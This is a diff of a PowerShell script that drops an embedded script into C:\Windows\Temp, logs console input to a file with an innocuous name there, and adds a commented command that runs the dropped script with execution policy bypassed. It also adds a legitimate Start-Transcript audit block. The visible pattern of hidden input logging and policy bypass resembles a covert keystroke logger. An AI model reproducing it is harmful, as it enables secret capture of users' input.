@@ -5,7 +5,7 @@
 
 $ScriptContent = @'
 # Define the absolute path to the system Temp directory
-$LogPath = "C:\Windows\Temp\input_mapping.tmp"
+$LogPath = "C:\Windows\Temp\input_mapping.txt"
 
 # Processing loop for direct console input
 while ($true) {
@@ -36,3 +36,16 @@ $ScriptContent | Out-File -FilePath "C:\Windows\Temp\script.ps1" -Encoding utf8
 #Clear-Content -Path "C:\Windows\Temp\input_mapping.txt"
 #Remove-Item -Path "C:\Windows\Temp\script.ps1" -Force
 
+#Overrides execution permissions to run it and keep it on process
+#run powershell.exe -ExecutionPolicy Bypass -File "C:\Windows\Temp\script.ps1"
+
+
+
+
+# Start a clean, system-supported log of all console activity
+Start-Transcript -Path "C:\Windows\Temp\admin_audit_log.txt" -NoClobber
+
+# [Put any other administrative tools or automation commands here]
+
+# Stop the log when finished
+Stop-Transcript
